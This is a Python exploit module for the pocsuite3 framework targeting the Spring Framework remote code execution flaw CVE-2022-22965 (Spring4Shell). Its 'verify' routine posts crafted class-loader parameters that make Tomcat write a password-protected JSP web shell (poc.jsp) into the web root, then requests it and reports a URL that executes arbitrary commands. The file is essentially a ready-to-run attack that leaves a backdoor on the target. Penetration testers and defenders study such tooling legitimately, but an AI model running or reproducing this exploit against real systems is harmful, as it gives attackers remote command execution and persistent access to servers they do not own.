from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
import requests
from urllib.parse import urljoin


class Spring4Shell(POCBase):
    vulID = '0'  # ssvid
    version = '1.0'
    author = ['n11dc0la']
    vulDate = '2022-3-31'
    createDate = '2022-3-31'
    updateDate = '2022-3-31'
    references = ['https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement']
    name = 'Spring Framework RCE (CVE-2022-22965)'
    appPowerLink = 'https://spring.io'
    appName = 'Spring Framework'
    appVersion = '5.3.0 to 5.3.17,5.2.0 to 5.2.19,Older,unsupported versions are also affected'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = ''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"
                }
        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=poc&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        poc = requests.post(self.url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=True)
        shellurl = urljoin(self.url, 'poc.jsp')
        pocgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=True)
        if pocgo.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = 'poc.jsp'
            result['VerifyInfo']['Shell'] = shellurl + '?pwd=j&cmd=whoami'
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(Spring4Shell)